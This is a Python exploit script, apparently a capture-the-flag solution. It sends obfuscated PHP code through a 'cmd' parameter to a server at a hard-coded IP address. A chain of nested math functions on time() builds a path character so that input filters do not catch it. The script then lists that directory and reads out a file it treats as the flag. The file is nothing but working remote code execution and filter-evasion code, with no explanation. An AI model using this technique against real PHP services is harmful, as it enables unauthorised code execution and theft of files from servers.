import requests

URL = 'http://34.124.157.127:8009/'

def findFlag():
    params = {"cmd":"print_r(scandir(chr(intval(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(log(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(rad2deg(log(sqrt(sqrt(sqrt(rad2deg(rad2deg(rad2deg(rad2deg(rad2deg(log(rad2deg(sqrt(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(rad2deg(log(rad2deg(log(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(time())))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))"}
    print(requests.get(URL,params=params).text)

def readFlag():
    params = {"cmd":"print_r(readfile(next(array_reverse(scandir(chr(intval(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(log(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(rad2deg(log(sqrt(sqrt(sqrt(rad2deg(rad2deg(rad2deg(rad2deg(rad2deg(log(rad2deg(sqrt(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(rad2deg(log(rad2deg(log(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(sqrt(rad2deg(time()))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))"}
    print("Flag: ",requests.get(URL,params=params).text)

if __name__ == '__main__':
    findFlag()
    readFlag()
    
